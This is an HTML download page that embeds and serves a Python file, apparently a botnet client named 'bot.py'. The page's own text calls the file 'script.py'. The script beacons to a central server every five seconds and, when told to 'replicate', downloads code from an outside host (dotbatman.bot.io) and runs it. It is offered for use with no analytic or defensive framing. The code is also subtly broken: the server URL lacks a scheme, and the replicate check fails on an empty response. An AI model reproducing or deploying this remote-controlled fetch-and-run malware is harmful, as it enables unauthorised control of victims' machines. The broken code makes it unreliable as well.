<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Script</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #0f172a;
    color: #e2e8f0;
    display: flex;
    justify-content: center;
    padding: 40px 20px;
  }
  .container {
    width: 100%;
    max-width: 800px;
  }
  h1 {
    font-size: 1.8rem;
    margin: 0 0 8px;
    color: #38bdf8;
  }
  p.sub {
    margin: 0 0 24px;
    color: #94a3b8;
    font-size: 0.95rem;
  }
  pre {
    width: 100%;
    height: 400px;
    padding: 16px;
    margin: 0;
    font-family: "SF Mono", Consolas, Monaco, monospace;
    font-size: 14px;
    line-height: 1.5;
    background: #1e293b;
    color: #e2e8f0;
    border: 1px solid #334155;
    border-radius: 8px;
    overflow: auto;
    white-space: pre;
    user-select: text;
  }
  .controls {
    margin-top: 16px;
    display: flex;
    gap: 12px;
    flex-wrap: wrap;
    align-items: center;
  }
  button {
    padding: 10px 20px;
    font-size: 0.95rem;
    font-weight: 600;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    background: #38bdf8;
    color: #0f172a;
    transition: background 0.15s;
  }
  button:hover {
    background: #7dd3fc;
  }
  .filename {
    font-family: "SF Mono", Consolas, Monaco, monospace;
    font-size: 0.9rem;
    color: #94a3b8;
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Download Script</h1>
    <p class="sub">Click the button to download <span class="filename">script.py</span>.</p>

    <pre id="codeView"></pre>

    <div class="controls">
      <button id="downloadBtn">Download script.py</button>
    </div>
  </div>

<script>
  // ─────────────────────────────────────────────
  // HARD-CODED FILE — edit this section only
  // ─────────────────────────────────────────────
  const SCRIPT_FILENAME = "bot.py";

  const SCRIPT_CONTENT = `import requests
import time
import os
import subprocess

# Define the central server URL
CENTRAL_SERVER_URL = '192.168.8.119'
BOT_SCRIPT_URL = 'http://dotbatman.bot.io/'

def send_request(command):
    try:
        response = requests.post(CENTRAL_SERVER_URL, json={'command': command})
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error sending request: {e}")
        return None

def download_bot_script():
    try:
        response = requests.get(BOT_SCRIPT_URL)
        with open('bot.py', 'wb') as f:
            f.write(response.content)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error downloading bot script: {e}")
        return False

def install_bot_script():
    try:
        subprocess.run(['pip', 'install', 'requests'], check=True)
        subprocess.run(['python', 'bot.py'], check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error installing bot script: {e}")
        return False

def main():
    while True:
        # Send a heartbeat to the server
        send_request('heartbeat')
        time.sleep(5)

        # Check if the bot script should replicate
        if 'replicate' in send_request('check_replicate'):
            if download_bot_script():
                install_bot_script()

if __name__ == '__main__':
    main()
`;
  // ─────────────────────────────────────────────
  // End of hard-coded file
  // ─────────────────────────────────────────────

  const codeView    = document.getElementById('codeView');
  const downloadBtn = document.getElementById('downloadBtn');

  // Display the code (read-only — it's a <pre>, not an editable field)
  codeView.textContent = SCRIPT_CONTENT;

  downloadBtn.addEventListener('click', () => {
    const blob = new Blob([SCRIPT_CONTENT], { type: 'text/x-python;charset=utf-8' });
    const url  = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = SCRIPT_FILENAME;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  });
</script>
</body>
</html>
